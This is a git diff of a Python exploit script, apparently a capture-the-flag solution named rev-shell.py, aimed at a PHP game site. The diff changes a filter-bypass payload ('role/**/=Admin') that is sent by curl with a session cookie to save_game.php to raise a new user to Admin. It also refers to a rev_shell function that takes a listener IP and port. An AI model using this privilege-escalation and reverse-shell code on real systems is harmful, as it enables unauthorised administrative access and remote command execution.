@@ -9,7 +9,7 @@ password = 'password'
 def createUser():
     global session
     session = requests.session()
-    session.proxies.update({'http': 'http://127.0.0.1:8080'}) # debug
+    # session.proxies.update({'http': 'http://127.0.0.1:8080'}) # debug
     session.get(url + '/index.php')
 
     body = {
@@ -20,16 +20,15 @@ def createUser():
     session.post(f'{url}/authenticate.php', data=body)
 
 def bypassFilter():
-    param = 'role='
-    payload = ''.join([f'%{hex(ord(c))[2:]}' for c in param]) + "'Admin'%23"
-    
+    payload = 'role/**/=Admin'
+
     # using request won't work with the payload
-    params = '?level=100&clicks=100&' + payload
+    params = '?clicks=100&level=100&' + payload
     subprocess.call(["curl",
                      "-v", 
                      "--cookie", f"PHPSESSID={session.cookies['PHPSESSID']}",
                      f"{url}/save_game.php{params}"
-                     ], 
+                     ],
                      stdout=subprocess.DEVNULL,
                      stderr=subprocess.STDOUT)
  
@@ -59,7 +58,7 @@ def rev_shell(path):
 
 if __name__ == '__main__':
     if len(sys.argv) < 2:
-        print("[!] Usage: python3 rev-shell.py <ip> <port>")
+        print("[!] Usage: python3 rev-shell.py <lip> <lport>")
 
     global ip, port
     ip = sys.argv[1]
